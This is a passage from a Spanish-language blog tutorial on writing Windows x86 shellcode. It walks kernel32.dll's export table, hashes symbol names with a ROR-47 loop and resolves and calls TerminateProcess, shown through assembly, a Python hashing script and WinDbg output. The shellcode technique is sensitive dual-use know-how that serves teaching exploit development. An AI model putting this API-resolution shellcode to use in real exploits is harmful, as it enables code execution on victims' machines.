<p class="plain-text">Entonces seguimos con <code class="language-plaintext highlighter-rouge">.find_loop</code> que comienza con un salto condicional baseado en el valor de <code class="language-plaintext highlighter-rouge">ecx</code>, si se cumple significa que hemos llegado al final de la lista sin encontrar el nombre del simbolo, si el valor de <code class="language-plaintext highlighter-rouge">ecx</code> no es <code class="language-plaintext highlighter-rouge">0x0</code> decrementamos el contador y obtenemos la <code class="language-plaintext highlighter-rouge">VMA</code> de <code class="language-plaintext highlighter-rouge">AddressOfNames</code>, podemos utilizar <code class="language-plaintext highlighter-rouge">ecx</code> como indice de <code class="language-plaintext highlighter-rouge">AddressOfNames</code> y multiplicarlo por <code class="language-plaintext highlighter-rouge">4</code> ya que cada entrada es un <code class="language-plaintext highlighter-rouge">dword</code>, despues guardamos el <code class="language-plaintext highlighter-rouge">RVA</code> del nombre del simbolo en <code class="language-plaintext highlighter-rouge">esi</code> para finalmente obtener el <code class="language-plaintext highlighter-rouge">VMA</code> del nombre del simbolo añadiendo la direccion base de <code class="language-plaintext highlighter-rouge">kernel32.dll</code></p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="o">    .</span><span class="na">find_loop</span><span class="p">:
        </span><span class="o">jecxz .</span><span class="na">find_end             </span><span class="c1">; if ecx = 0x0
        </span><span class="o">dec </span><span class="mi">ecx                     </span><span class="c1">; counter -= 1
        </span><span class="o">mov </span><span class="mi">eax</span><span class="p">, [</span><span class="mi">ebp </span><span class="o">- </span><span class="mi">0x4</span><span class="p">]        </span><span class="c1">; $eax = Name Pointer Table  
        </span><span class="o">mov </span><span class="mi">esi</span><span class="p">, [</span><span class="mi">eax </span><span class="o">+ </span><span class="mi">ecx </span><span class="o">* </span><span class="mi">4</span><span class="p">]    </span><span class="c1">; RVA of symbol name
        </span><span class="o">add </span><span class="mi">esi</span><span class="p">, </span><span class="mi">ebx                </span><span class="c1">; symbol name</span>
</code></pre></div></div><br>

<p class="plain-text">Finalmente para salir de la función restauramos los registros guardados y retornamos</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="o">    .</span><span class="na">find_end</span><span class="p">:
        </span><span class="o">popa                        </span><span class="c1">; restore registers  
        </span><span class="o">ret                         </span><span class="c1">; return</span>
</code></pre></div></div><br>

<p class="plain-text">El encabezado PE puede encontrarse en el offset <code class="language-plaintext highlighter-rouge">0xf8</code>, mirando esta estructura podemos notar la estructura <code class="language-plaintext highlighter-rouge">_IMAGE_OPTIONAL_HEADER</code> en el offset <code class="language-plaintext highlighter-rouge">0x18</code></p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ro">0:000> </span><span class="p">g
(1898.1e74): Break instruction exception - code 80000003 (first chance)
eax=6f5f7210 ebx=0042b000 ecx=00131000 edx=00131000 esi=00131000 edi=00131000  
eip=00131000 esp=007ff80c ebp=007ff81c iopl=0         nv up ei pl zr na pe nc  
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246  
shellcode+0x1000:
00131000 cc              int     3

</span><span class="ro">0:000> </span><span class="p">lm m kernel32
Browse full module list
start    end        module name
77480000 77515000   KERNEL32   (derefered)

</span><span class="ro">0:000> </span><span class="p">dt ntdll!_IMAGE_DOS_HEADER 0x77480000 
   +0x000 e_magic          : 0x5a4d
   +0x002 e_cblp           : 0x90
   +0x004 e_cp             : 3
   +0x006 e_crlc           : 0
   +0x008 e_cparhdr        : 4
   +0x00a e_minalloc       : 0
   +0x00c e_maxalloc       : 0xffff
   +0x00e e_ss             : 0
   +0x010 e_sp             : 0xb8
   +0x012 e_csum           : 0
   +0x014 e_ip             : 0
   +0x016 e_cs             : 0
   +0x018 e_lfarlc         : 0x40
   +0x01a e_ovno           : 0
   +0x01c e_res            : [4] 0
   +0x024 e_oemid          : 0
   +0x026 e_oeminfo        : 0
   +0x028 e_res2           : [10] 0
   +0x03c e_lfanew         : 0n248

</span><span class="ro">0:000> </span><span class="p">? 0n248
Evaluate expression: 248 = 000000f8

</span><span class="ro">0:000> </span><span class="p">dt ntdll!_IMAGE_NT_HEADERS 0x77480000 + 0xf8
   +0x000 Signature        : 0x4550
   +0x004 FileHeader       : _IMAGE_FILE_HEADER
   +0x018 OptionalHeader   : _IMAGE_OPTIONAL_HEADER  </span>
</code></pre></div></div><br>

<p class="plain-text">Esta estructura contiene dentro otra estructura llamada <code class="language-plaintext highlighter-rouge">_IMAGE_DATA_DIRECTORY</code> en el offset <code class="language-plaintext highlighter-rouge">0x60</code>, el campo <code class="language-plaintext highlighter-rouge">DataDirectory</code> se representa como una lista de longitud <code class="language-plaintext highlighter-rouge">16</code></p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ro">0:000> </span><span class="p">dt ntdll!_IMAGE_OPTIONAL_HEADER 0x77480000 + 0xf8 + 0x18  
   +0x000 Magic            : 0x10b
   +0x002 MajorLinkerVersion : 0xe ''
   +0x003 MinorLinkerVersion : 0xa ''
   +0x004 SizeOfCode       : 0x82000
   +0x008 SizeOfInitializedData : 0x12000
   +0x00c SizeOfUninitializedData : 0
   +0x010 AddressOfEntryPoint : 0x195e0
   +0x014 BaseOfCode       : 0x1000
   +0x018 BaseOfData       : 0x83000
   +0x01c ImageBase        : 0x77480000
   +0x020 SectionAlignment : 0x1000
   +0x024 FileAlignment    : 0x1000
   +0x028 MajorOperatingSystemVersion : 0xa
   +0x02a MinorOperatingSystemVersion : 0
   +0x02c MajorImageVersion : 0xa
   +0x02e MinorImageVersion : 0
   +0x030 MajorSubsystemVersion : 0xa
   +0x032 MinorSubsystemVersion : 0
   +0x034 Win32VersionValue : 0
   +0x038 SizeOfImage      : 0x95000
   +0x03c SizeOfHeaders    : 0x1000
   +0x040 CheckSum         : 0x98558
   +0x044 Subsystem        : 3
   +0x046 DllCharacteristics : 0x4140
   +0x048 SizeOfStackReserve : 0x40000
   +0x04c SizeOfStackCommit : 0x1000
   +0x050 SizeOfHeapReserve : 0x100000
   +0x054 SizeOfHeapCommit : 0x1000
   +0x058 LoaderFlags      : 0
   +0x05c NumberOfRvaAndSizes : 0x10
   +0x060 DataDirectory    : [16] _IMAGE_DATA_DIRECTORY</span>
</code></pre></div></div><br>

<p class="plain-text">Esta estructura se compone de 2 <code class="language-plaintext highlighter-rouge">dwords</code> que da como resultado un tamaño de <code class="language-plaintext highlighter-rouge">0x8</code></p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="no">typedef struct </span><span class="na">_IMAGE_DATA_DIRECTORY </span><span class="p">{
    </span><span class="no">DWORD </span><span class="p">VirtualAddress;
    </span><span class="no">DWORD </span><span class="p">Size;
} IMAGE_DATA_DIRECTORY, </span><span class="o">*</span><span class="p">PIMAGE_DATA_DIRECTORY;</span>
</code></pre></div></div><br>

<p class="plain-text">Encontraremos la estructura <code class="language-plaintext highlighter-rouge">_IMAGE_OPTIONAL_HEADER</code> en el offset <code class="language-plaintext highlighter-rouge">0x18</code> de la cabecera PE, en el offset <code class="language-plaintext highlighter-rouge">0x60</code> localizaremos la primera entrada de <code class="language-plaintext highlighter-rouge">DataDirectory</code> que contiene informacion sobre la <code class="language-plaintext highlighter-rouge">Export Directory Table</code>, esta informacion confirma que el shellcode utiliza el offset de <code class="language-plaintext highlighter-rouge">0x78</code> correcto para obtener la <code class="language-plaintext highlighter-rouge">EDT</code></p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ro">0:000> </span><span class="p">dt ntdll!_IMAGE_DATA_DIRECTORY 0x77480000 + 0xf8 + 0x78  
   +0x000 VirtualAddress   : 0x75480
   +0x004 Size             : 0xd836

</span><span class="ro">0:000> </span><span class="p">!dh -f kernel32
File Type: DLL
FILE HEADER VALUES
     14C machine (i386)
       5 number of sections
57CE72FD time date stamp Tue Sep  6 02:40:45 2016

       0 file pointer to symbol table
       0 number of symbols
      E0 size of optional header
    2102 characteristics
            Executable
            32 bit word machine
            DLL

OPTIONAL HEADER VALUES
     10B magic #
   14.10 linker version
   82000 size of code
   12000 size of initialized data
       0 size of uninitialized data
   195E0 address of entry point
    1000 base of code

    4140  DLL characteristics
            Dynamic base
            NX compatible
            Guard
   75480 [    D836] address [size] of Export Directory
   853E8 [     6F4] address [size] of Import Directory
   8F000 [     520] address [size] of Resource Directory</span>
</code></pre></div></div><br>

<p class="plain-text">Despues de obtener la <code class="language-plaintext highlighter-rouge">RVA</code> para la <code class="language-plaintext highlighter-rouge">EDT</code> determinaremos si el shellcode recupera el mismo valor, y antes de sumarle la direccion base el valor de <code class="language-plaintext highlighter-rouge">edi</code> coincide con este</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ro">0:000> </span><span class="p">p
eax=000000f8 ebx=77480000 ecx=00000000 edx=00bf1000 esi=779bab5c edi=00075480  
eip=00bf1033 esp=00fffe00 ebp=00fffe4c iopl=0         nv up ei pl zr na pe nc  
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246  
shellcode+0x1033:
00bf1033 01df            add     edi,ebx

</span><span class="ro">0:000> </span><span class="p">r edi
edi=00075480</span>
</code></pre></div></div><br>

<p class="plain-text">Al seguir ejecutando el shellcode hasta la función <code class="language-plaintext highlighter-rouge">.find_end</code> el registro <code class="language-plaintext highlighter-rouge">esi</code> deberia apuntar al nombre del ultimo simbolo exportado por <code class="language-plaintext highlighter-rouge">kernel32.dll</code></p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ro">0:000> </span><span class="p">r
eax=774f6d90 ebx=77480000 ecx=00000639 edx=00bf1000 esi=77502caa edi=774f5480  
eip=00bf104b esp=00fffe00 ebp=00fffe4c iopl=0         nv up ei pl nz na pe nc  
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000206  
shellcode+0x104b:
00bf104b 61              popad

</span><span class="ro">0:000> </span><span class="p">da esi
77502caa  "timeGetTime"</span>
</code></pre></div></div><br>

</section>

<section class="post" id="hash">
<br><h3 class="post-title">Compute hash</h3><br>

<p class="plain-text">Con lo anterior estamos listos para analizar la lista <code class="language-plaintext highlighter-rouge">ArrayOfNames</code> en busca del simbolo que nos interesa, en este caso <code class="language-plaintext highlighter-rouge">TerminateProcess</code> para ello utilizaremos un algoritmo de <code class="language-plaintext highlighter-rouge">hash</code> que genera un <code class="language-plaintext highlighter-rouge">dword</code> unico para buscarlo en lugar de la longitud de la cadena o varias partes del nombre del simbolo este produce el mismo resultado obtenido por <code class="language-plaintext highlighter-rouge">GetProcAddress</code> y se puede reutilizar para todas las librerias</p>

<p class="plain-text">La primera parte a agregar comienza asignando el valor <code class="language-plaintext highlighter-rouge">0x0</code> al registro <code class="language-plaintext highlighter-rouge">eax</code>, tambien utiliza <code class="language-plaintext highlighter-rouge">cdq</code> para establecer <code class="language-plaintext highlighter-rouge">edx</code> en <code class="language-plaintext highlighter-rouge">0x0</code> con menos peso que el tipico xor</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="o">        xor </span><span class="mi">eax</span><span class="p">, </span><span class="mi">eax                </span><span class="c1">; $eax = 0x0
        </span><span class="o">cdq                         </span><span class="c1">; $edx = 0x0  </span>
</code></pre></div></div><br>

<p class="plain-text">La funcion <code class="language-plaintext highlighter-rouge">.compute_hash</code> comienza ejecutando <code class="language-plaintext highlighter-rouge">lodsb</code> que cargara un byte de la memoria apuntada por <code class="language-plaintext highlighter-rouge">esi</code> al registro <code class="language-plaintext highlighter-rouge">al</code> y luego incrementara o disminuira automaticamente el registro de acuerdo con la flag <code class="language-plaintext highlighter-rouge">df</code>, despues una instruccion <code class="language-plaintext highlighter-rouge">test</code> para comprobar si <code class="language-plaintext highlighter-rouge">al</code> es <code class="language-plaintext highlighter-rouge">0x0</code>, si lo es tomara el salto <code class="language-plaintext highlighter-rouge">jz</code> hacia <code class="language-plaintext highlighter-rouge">.find_end</code>, si <code class="language-plaintext highlighter-rouge">al</code> no es <code class="language-plaintext highlighter-rouge">0x0</code> llegaremos a una operacion bit a bit con <code class="language-plaintext highlighter-rouge">ror</code> que rota los bits del primer operando a la derecha el numero de posiciones de bit especificado en el segundo operando, en este caso se rota <code class="language-plaintext highlighter-rouge">47</code> o <code class="language-plaintext highlighter-rouge">0x2f</code> bits, aunque lugar de <code class="language-plaintext highlighter-rouge">rot 47</code> se pudo usar <code class="language-plaintext highlighter-rouge">rot 13</code> la representacion de este es <code class="language-plaintext highlighter-rouge">0xd</code> que como se ha visto en explotaciones anteriores suele ser un <code class="language-plaintext highlighter-rouge">badchar</code> bastante comun asi que lo evitaremos</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="o">    .</span><span class="na">compute_hash</span><span class="p">:
        </span><span class="o">lodsb                       </span><span class="c1">; load in al next byte from esi
        </span><span class="o">test </span><span class="mi">al</span><span class="p">, </span><span class="mi">al                 </span><span class="c1">; check null terminator
        </span><span class="o">jz .</span><span class="na">find_end                </span><span class="c1">; If ZF == 1
        </span><span class="o">ror </span><span class="mi">edx</span><span class="p">, </span><span class="mi">0x2f               </span><span class="c1">; rot 47
        </span><span class="o">add </span><span class="mi">edx</span><span class="p">, </span><span class="mi">eax                </span><span class="c1">; add new byte
        </span><span class="o">jmp .</span><span class="na">compute_hash           </span><span class="c1">; loop

    </span><span class="o">.</span><span class="na">find_end</span><span class="p">:
        </span><span class="o">popa                        </span><span class="c1">; restore registers
        </span><span class="o">ret                         </span><span class="c1">; return</span>
</code></pre></div></div><br>

<p class="plain-text">Para entender como funciona <code class="language-plaintext highlighter-rouge">ror</code> podemos probarlo dentro de windbg, guardando en <code class="language-plaintext highlighter-rouge">eax</code> un valor y ejecutando <code class="language-plaintext highlighter-rouge">ror eax, 0x1</code>, al ejecutarlo vemos el resultado</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ro">0:000> </span><span class="p">r eax=0x41

</span><span class="ro">0:000> </span><span class="p">a eip
00bf104b ror eax, 0x1
ror eax, 0x1
00bf104d 

</span><span class="ro">0:000> </span><span class="p">.formats eax
Evaluate expression:
  Hex:     00000041
  Decimal: 65
  Octal:   00000000101
  Binary:  00000000 00000000 00000000 01000001
  Chars:   ...A
  Time:    Wed Dec 31 18:01:05 1969
  Float:   low 9.10844e-044 high 0
  Double:  3.21143e-322

</span><span class="ro">0:000> </span><span class="p">p
eax=80000020 ebx=77480000 ecx=00000639 edx=00bf1000 esi=77502caa edi=774f5480  
eip=00bf104d esp=00fffe00 ebp=00fffe4c iopl=0         ov up ei pl nz na pe cy  
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000a07  
shellcode+0x104d:
00bf104d ff              ???

</span><span class="ro">0:000> </span><span class="p">.formats eax
Evaluate expression:
  Hex:     80000020
  Decimal: -2147483616
  Octal:   20000000040
  Binary:  10000000 00000000 00000000 00100000
  Chars:   ... 
  Time:    ***** Invalid
  Float:   low -4.48416e-044 high -1.#QNAN
  Double:  -1.#QNAN</span>
</code></pre></div></div><br>

<p class="plain-text">Despues del <code class="language-plaintext highlighter-rouge">ror</code> añadimos el valor de <code class="language-plaintext highlighter-rouge">eax</code> que contiene un byte del simbolo al registro <code class="language-plaintext highlighter-rouge">edx</code> y saltamos a <code class="language-plaintext highlighter-rouge">.compute_hash</code>, este bucle repasara cada <code class="language-plaintext highlighter-rouge">byte</code> del nombre de simbolo y lo añadira a <code class="language-plaintext highlighter-rouge">edx</code>, esto devolverá un <code class="language-plaintext highlighter-rouge">hash</code> unico de 4 bytes para el simbolo por lo que podemos compararlo con un <code class="language-plaintext highlighter-rouge">hash</code> precomputado para determinar si la entrada es correcta y hemos encontrado la funcion que necesitamos</p>

<p class="plain-text">Podemos escribir un simple script en <code class="language-plaintext highlighter-rouge">python</code> que realice la misma operacion para poder calcular el <code class="language-plaintext highlighter-rouge">hash</code> de un simbolo para buscarlo en el shellcode</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="c1">#!/usr/bin/python3
</span><span class="o">import </span><span class="p">sys

</span><span class="o">def </span><span class="na">ror</span><span class="p">(</span><span class="am">byte</span><span class="p">, </span><span class="am">count</span><span class="p">):
    binb </span><span class="o">= </span><span class="no">bin</span><span class="p">(byte)[</span><span class="mi">2</span><span class="p">:].zfill(</span><span class="mi">32</span><span class="p">)
    binb </span><span class="o">= </span><span class="p">binb[</span><span class="o">-</span><span class="p">count </span><span class="o">% </span><span class="mi">32</span><span class="p">:] </span><span class="o">+ </span><span class="p">binb[:</span><span class="o">-</span><span class="p">count </span><span class="o">% </span><span class="mi">32</span><span class="p">]  
    </span><span class="o">return </span><span class="na">int</span><span class="p">(binb, </span><span class="mi">2</span><span class="p">)

esi </span><span class="o">= </span><span class="p">sys.argv[</span><span class="mi">1</span><span class="p">]
edx </span><span class="o">= </span><span class="mi">0x0</span><span class="p">

counter </span><span class="o">= </span><span class="mi">0</span><span class="p">

</span><span class="o">for </span><span class="p">eax </span><span class="o">in </span><span class="p">esi:
    edx </span><span class="o">= </span><span class="p">edx </span><span class="o">+ </span><span class="no">ord</span><span class="p">(eax)
    </span><span class="o">if </span><span class="p">counter </span><span class="o">< </span><span class="no">len</span><span class="p">(esi) </span><span class="o">- </span><span class="mi">1</span><span class="p">:
        edx </span><span class="o">= </span><span class="p">ror(edx, </span><span class="mi">47</span><span class="p">)
        counter </span><span class="o">+= </span><span class="mi">1</span><span class="p">

</span><span class="no">print</span><span class="p">(</span><span class="no">hex</span><span class="p">(edx))</span>
</code></pre></div></div><br>

<p class="plain-text">El script recibe una cadena en este caso le pasaremos <code class="language-plaintext highlighter-rouge">timeGetTime</code> para generar el hash, este fue el el nombre del ultimo simbolo exportado por <code class="language-plaintext highlighter-rouge">kernel32.dll</code></p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ve">❯ python3 </span><span class="p">hash.py timeGetTime  
0x149c580a</span>
</code></pre></div></div><br>

<p class="plain-text">Ejecutamos el shellcode actualizado para confirmar que el algoritmo funciona, si nos detenemos en <code class="language-plaintext highlighter-rouge">.find_function</code> podemos ver el codigo que genera el <code class="language-plaintext highlighter-rouge">hash</code></p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ro">0:000> </span><span class="p">r
eax=7da34f81 ebx=77480000 ecx=00000000 edx=010f1000 esi=779bab5c edi=00b32388  
eip=010f102b esp=009ffa7c ebp=009ffaa8 iopl=0         nv up ei pl zr na pe nc  
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246  
shellcode+0x102b:
010f102b 60              pushad

</span><span class="ro">0:000> </span><span class="p">u eip L18
shellcode+0x102b:
010f102b 60              pushad
010f102c 8b433c          mov     eax,dword ptr [ebx+3Ch]
010f102f 8b7c0378        mov     edi,dword ptr [ebx+eax+78h]
010f1033 01df            add     edi,ebx
010f1035 8b4f18          mov     ecx,dword ptr [edi+18h]
010f1038 8b4720          mov     eax,dword ptr [edi+20h]
010f103b 01d8            add     eax,ebx
010f103d 8945fc          mov     dword ptr [ebp-4],eax
010f1040 e319            jecxz   shellcode+0x105b (010f105b)
010f1042 49              dec     ecx
010f1043 8b45fc          mov     eax,dword ptr [ebp-4]
010f1046 8b3488          mov     esi,dword ptr [eax+ecx*4]
010f1049 01de            add     esi,ebx
010f104b 31c0            xor     eax,eax
010f104d 99              cdq
010f104e fc              cld
010f104f ac              lods    byte ptr [esi]
010f1050 84c0            test    al,al
010f1052 7407            je      shellcode+0x105b (010f105b)
010f1054 c1ca2f          ror     edx,2Fh
010f1057 01c2            add     edx,eax
010f1059 ebf4            jmp     shellcode+0x104f (010f104f)
010f105b 61              popad
010f105c c3              ret</span>
</code></pre></div></div><br>

<p class="plain-text">El primer salto lo hacemos despues de que encuentra la primera entrada de la tabla que es la funcion <code class="language-plaintext highlighter-rouge">timeGetTime</code>, despues saltamos a <code class="language-plaintext highlighter-rouge">.find_end</code> y comprobamos que el hash calculado con el script de <code class="language-plaintext highlighter-rouge">python</code> coincide con el valor del registro <code class="language-plaintext highlighter-rouge">edx</code></p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ro">0:000> </span><span class="p">g 0x010f104b 
eax=774f6d90 ebx=77480000 ecx=00000639 edx=010f1000 esi=77502caa edi=774f5480  
eip=010f104b esp=009ffa5c ebp=009ffaa8 iopl=0         nv up ei pl nz na pe nc  
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000206  
shellcode+0x104b:
010f104b 31c0            xor     eax,eax

</span><span class="ro">0:000> </span><span class="p">da esi
77502caa  "timeGetTime"

</span><span class="ro">0:000> </span><span class="p">g 0x010f105b
eax=00000000 ebx=77480000 ecx=00000639 edx=149c580a esi=77502cb6 edi=774f5480  
eip=010f105b esp=009ffa5c ebp=009ffaa8 iopl=0         nv up ei pl zr na pe nc  
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246  
shellcode+0x105b:
010f105b 61              popad

</span><span class="ro">0:000> </span><span class="p">r edx
edx=149c580a</span>
</code></pre></div></div><br>

<p class="plain-text">Ahora que hemos comprobado que el algoritmo <code class="language-plaintext highlighter-rouge">hash</code> funciona podemos buscar el simbolo <code class="language-plaintext highlighter-rouge">TerminateProcess</code> obtener su dirección dentro del shellcode</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ve">❯ python3 </span><span class="p">hash.py TerminateProcess  
0x8ee05933</span>
</code></pre></div></div><br>

<p class="plain-text">El primer cambio es en la funcion <code class="language-plaintext highlighter-rouge">_start</code>, colocamos en la pila el <code class="language-plaintext highlighter-rouge">hash</code> calculado, luego llamamos la función <code class="language-plaintext highlighter-rouge">.find_function</code> para resolverlo, este devuelve en <code class="language-plaintext highlighter-rouge">eax</code> su dirección por lo que le pasamos los argumentos necesarios y llamamos a la función</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="no">global </span><span class="na">_start

_start</span><span class="p">:
    </span><span class="o">int3</span><span class="p">
    </span><span class="o">mov </span><span class="mi">ebp</span><span class="p">, </span><span class="mi">esp                    </span><span class="c1">; new stack frame
    </span><span class="o">sub </span><span class="mi">esp</span><span class="p">, </span><span class="mi">0x28                   </span><span class="c1">; space for variables

    </span><span class="o">call .</span><span class="na">find_kernel32             </span><span class="c1">; find kernel32

    </span><span class="o">push </span><span class="mi">0x8ee05933                 </span><span class="c1">; TerminateProcess() hash  
    </span><span class="o">call </span><span class="o">.</span><span class="na">find_function             </span><span class="c1">; find TerminateProcess()  

    </span><span class="o">xor </span><span class="mi">ecx</span><span class="p">, </span><span class="mi">ecx                    </span><span class="c1">; $ecx = 0x0
    </span><span class="o">push </span><span class="mi">ecx                        </span><span class="c1">; uExitCode
    </span><span class="o">push </span><span class="mi">0xffffffff                 </span><span class="c1">; hProcess
    </span><span class="o">call </span><span class="mi">eax                        </span><span class="c1">; call TerminateProcess()  </span>
</code></pre></div></div><br>

<p class="plain-text">La funcion <code class="language-plaintext highlighter-rouge">.compare_hash</code> compara <code class="language-plaintext highlighter-rouge">edx</code> y el valor apuntado por <code class="language-plaintext highlighter-rouge">esp + 0x24</code>, para que esta comparacion funcione necesitamos asegurarnos que <code class="language-plaintext highlighter-rouge">esp + 0x24</code> apunte al <code class="language-plaintext highlighter-rouge">hash</code> precomputado, si los hashes comparados no coinciden volveremos a <code class="language-plaintext highlighter-rouge">.find_loop</code> y tomaremos la siguiente entrada de la lista <code class="language-plaintext highlighter-rouge">AddressOfNameOrdinals</code> en el offset <code class="language-plaintext highlighter-rouge">0x24</code> de la <code class="language-plaintext highlighter-rouge">EDT</code> que se almacena en <code class="language-plaintext highlighter-rouge">edi</code>, la siguiente instruccion añade la base de <code class="language-plaintext highlighter-rouge">kernel32.dll</code> al <code class="language-plaintext highlighter-rouge">RVA</code> de <code class="language-plaintext highlighter-rouge">AddressOfNameOrdinals</code>, seguido de esto se mueve a <code class="language-plaintext highlighter-rouge">cx</code> <code class="language-plaintext highlighter-rouge">[edx + 2 * ecx]</code> que se utiliza como indice de la lista <code class="language-plaintext highlighter-rouge">AddressOfNames</code></p>
<p class="plain-text">Una vez que encontramos la entrada para nuestro simbolo podemos utilizar el indice para recuperar la entrada de la lista <code class="language-plaintext highlighter-rouge">AddressOfNameOrdinals</code>, multiplicamos <code class="language-plaintext highlighter-rouge">ecx</code> por <code class="language-plaintext highlighter-rouge">0x2</code> ya que cada entrada es un <code class="language-plaintext highlighter-rouge">word</code>, luego movemos el valor al registro <code class="language-plaintext highlighter-rouge">cx</code> que es nuestro contador/indice, usaremos este nuevo valor como nuevo indice de la lista <code class="language-plaintext highlighter-rouge">AddressOfFunctions</code>, antes de tomar el nuevo indice tomamos el <code class="language-plaintext highlighter-rouge">RVA</code> en el offset <code class="language-plaintext highlighter-rouge">0x1c</code> de la <code class="language-plaintext highlighter-rouge">EDT</code>, y le añadimos la base de <code class="language-plaintext highlighter-rouge">kernel32</code>, usando el indice recuperamos el <code class="language-plaintext highlighter-rouge">RVA</code> de la funcion y al sumarle la base de <code class="language-plaintext highlighter-rouge">kernel32.dll</code> obtenemos el <code class="language-plaintext highlighter-rouge">VMA</code></p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="o">    .</span><span class="na">compute_hash</span><span class="p">:
        </span><span class="o">lodsb                       </span><span class="c1">; load in al next byte from esi  
        </span><span class="o">test </span><span class="mi">al</span><span class="p">, </span><span class="mi">al                 </span><span class="c1">; check null terminator
        </span><span class="o">jz .</span><span class="na">compare_hash            </span><span class="c1">; If ZF == 1
        </span><span class="o">ror </span><span class="mi">edx</span><span class="p">, </span><span class="mi">0x2f               </span><span class="c1">; rot 47
        </span><span class="o">add </span><span class="mi">edx</span><span class="p">, </span><span class="mi">eax                </span><span class="c1">; add new byte
        </span><span class="o">jmp .</span><span class="na">compute_hash           </span><span class="c1">; loop

   </span><span class="o">.</span><span class="na">compare_hash</span><span class="p">:
        </span><span class="o">cmp </span><span class="mi">edx</span><span class="p">, [</span><span class="mi">esp </span><span class="o">+ </span><span class="mi">0x24</span><span class="p">]       </span><span class="c1">; cmp edx, hash
        </span><span class="o">jnz .</span><span class="na">find_loop              </span><span class="c1">; if zf != 1
        </span><span class="o">mov </span><span class="mi">edx</span><span class="p">, [</span><span class="mi">edi </span><span class="o">+ </span><span class="mi">0x24</span><span class="p">]       </span><span class="c1">; RVA of Ordinal Table
        </span><span class="o">add </span><span class="mi">edx</span><span class="p">, </span><span class="mi">ebx                </span><span class="c1">; Ordinal Table
        </span><span class="o">mov </span><span class="mi">cx</span><span class="p">, [</span><span class="mi">edx </span><span class="o">+ </span><span class="mi">2 </span><span class="o">* </span><span class="mi">ecx</span><span class="p">]     </span><span class="c1">; extrapolate ordinal functions
        </span><span class="o">mov </span><span class="mi">edx</span><span class="p">, [</span><span class="mi">edi </span><span class="o">+ </span><span class="mi">0x1c</span><span class="p">]       </span><span class="c1">; RVA of Address Table
        </span><span class="o">add </span><span class="mi">edx</span><span class="p">, </span><span class="mi">ebx                </span><span class="c1">; Address Table
        </span><span class="o">mov </span><span class="mi">eax</span><span class="p">, [</span><span class="mi">edx </span><span class="o">+ </span><span class="mi">4 </span><span class="o">* </span><span class="mi">ecx</span><span class="p">]    </span><span class="c1">; RVA of function
        </span><span class="o">add </span><span class="mi">eax</span><span class="p">, </span><span class="mi">ebx                </span><span class="c1">; function
        </span><span class="o">mov </span><span class="p">[</span><span class="mi">esp </span><span class="o">+ </span><span class="mi">0x1c</span><span class="p">], </span><span class="mi">eax       </span><span class="c1">; overwrite eax from pushad

    </span><span class="o">.</span><span class="na">find_end</span><span class="p">:
        </span><span class="o">popa                        </span><span class="c1">; restore registers
        </span><span class="o">ret                         </span><span class="c1">; return</span>
</code></pre></div></div><br>

<p class="plain-text">Al correrlo en del debugger podemos ir a la instruccion final de <code class="language-plaintext highlighter-rouge">.compare_hash</code>, en el registro <code class="language-plaintext highlighter-rouge">eax</code> ahora se almacena la dirección de la función <code class="language-plaintext highlighter-rouge">TerminateProcess</code></p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ro">0:000> </span><span class="p">r
eax=774a9070 ebx=77480000 ecx=00000584 edx=774f54a8 esi=77501cd3 edi=774f5480
eip=00f71080 esp=013ffe74 ebp=013ffec4 iopl=0         nv up ei pl nz na po nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000202
shellcode+0x1080:
00f71080 8944241c        mov     dword ptr [esp+1Ch],eax ss:0023:013ffe90=9a0d9fa1

</span><span class="ro">0:000> </span><span class="p">u eax
KERNEL32!TerminateProcessStub:
774a9070 8bff            mov     edi,edi
774a9072 55              push    ebp
774a9073 8bec            mov     ebp,esp
774a9075 5d              pop     ebp
774a9076 ff2534495077    jmp     dword ptr [KERNEL32!_imp__TerminateProcess (77504934)]  
774a907c cc              int     3
774a907d cc              int     3
774a907e cc              int     3</span>
</code></pre></div></div><br>

<p class="plain-text">Despues de salir de la función <code class="language-plaintext highlighter-rouge">.find_function</code> se setean los registros que necesita <code class="language-plaintext highlighter-rouge">TerminateProcess</code> para finalmente llamarlo aprovechando que lo tenemos en <code class="language-plaintext highlighter-rouge">eax</code>, de esta forma logramos obtener y ejecutar un simbolo dentro de <code class="language-plaintext highlighter-rouge">kernel32.dll</code></p>
